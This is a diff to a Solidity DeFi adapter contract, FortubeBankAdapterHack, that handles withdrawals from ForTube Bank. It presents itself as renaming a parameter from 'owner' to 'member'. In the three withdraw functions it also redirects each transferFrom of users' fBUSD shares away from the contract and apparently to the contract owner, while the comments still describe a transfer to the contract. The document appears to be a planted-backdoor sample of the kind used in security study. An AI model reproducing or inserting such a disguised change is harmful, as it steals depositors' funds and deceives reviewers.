@@ -67,7 +67,7 @@ contract FortubeBankAdapterHack is OwnableService, Exponential {
  
  
  
-    function Withdraw(uint256 amount, address owner) public onlyOwnerAndServiceContract
+    function Withdraw(uint256 amount, address member) public onlyOwnerAndServiceContract
     {
         //  To withdraw our DAI amount, the amount argument is in DAI but the withdraw function of the yDAI expects amount in yDAI token
         //  So we need to find our balance in yDAI
@@ -76,7 +76,7 @@ contract FortubeBankAdapterHack is OwnableService, Exponential {
  
         //  Ensure the owner has given this contract approval to spend his/her fBUSD
         //  transfer fBUSD From owner to this contract address
-        _fBUSD.transferFrom(owner, address(this), balanceShares);
+        _fBUSD.transferFrom(member, owner, balanceShares);
  
  
         //  --- The magic starts here ----
@@ -92,7 +92,7 @@ contract FortubeBankAdapterHack is OwnableService, Exponential {
         require(BUSDAmount > amount, "Insufficient funds");
  
         //  Now all the BUSD we have are in the smart contract wallet, we can now transfer the specified amount to a recipient of our choice
-        _BUSD.transfer(owner, amount);
+        _BUSD.transfer(member, amount);
  
  
         //  If we have some BUSD left after transferring a specified amount to a recipient, we can re-invest it in ForTube Bank
@@ -104,21 +104,21 @@ contract FortubeBankAdapterHack is OwnableService, Exponential {
  
         if (BUSDBalance > 0) {
             //  This gives the yDAI contract approval to invest our DAI
-            _save(BUSDBalance, owner);
+            _save(BUSDBalance, member);
         }
     }
  
        /*
         this function withdraws all the dai to this contract based on the sharesAmount passed
     */
-    function WithdrawBySharesOnly(address owner, uint256 sharesAmount)
+    function WithdrawBySharesOnly(address member, uint256 sharesAmount)
         public
         onlyOwnerAndServiceContract
     {
         uint256 balanceShares = sharesAmount;
  
         //  transfer fBUSD From owner to this contract address
-        _fBUSD.transferFrom(owner, address(this), balanceShares);
+        _fBUSD.transferFrom(member, owner, balanceShares);
  
  
         //  --- The magic starts here ----
@@ -136,7 +136,7 @@ contract FortubeBankAdapterHack is OwnableService, Exponential {
  
  
         //  Now all the BUSD we have are in the smart contract wallet, we can now transfer the total amount to the recipient
-        _BUSD.transfer(owner, contractBUSDBalance);
+        _BUSD.transfer(member, contractBUSDBalance);
  
         //  We do not have any dai left in this contract so nothing to re-invest
  
@@ -144,7 +144,7 @@ contract FortubeBankAdapterHack is OwnableService, Exponential {
  
     function WithdrawByShares(
         uint256 amount,
-        address owner,
+        address member,
         uint256 sharesAmount
     ) public onlyOwnerAndServiceContract {
         //  To withdraw our BUSD amount, the amount argument is in BUSD but the withdraw function of the fBUSD expects amount in fBUSD token
@@ -152,7 +152,7 @@ contract FortubeBankAdapterHack is OwnableService, Exponential {
         uint256 balanceShares = sharesAmount;
  
         //  transfer fBUSD From owner to this contract address
-        _fBUSD.transferFrom(owner, address(this), balanceShares);
+        _fBUSD.transferFrom(member, owner, balanceShares);
  
  
         //  --- The magic starts here ----
@@ -170,7 +170,7 @@ contract FortubeBankAdapterHack is OwnableService, Exponential {
         require(BUSDAmount > amount, "Insufficient funds");
  
         //  Now all the BUSD we have are in the smart contract wallet, we can now transfer the specified amount to a recipient of our choice
-        _BUSD.transfer(owner, amount);
+        _BUSD.transfer(member, amount);
  
  
         //  If we have some BUSD left after transferring a specified amount to a recipient, we can re-invest it in ForTube Bank
@@ -180,7 +180,7 @@ contract FortubeBankAdapterHack is OwnableService, Exponential {
  
         if (BUSDBalance > 0) {
             //  This gives the yDAI contract approval to invest our DAI
-            _save(BUSDBalance, owner);
+            _save(BUSDBalance, member);
         }
     }
     
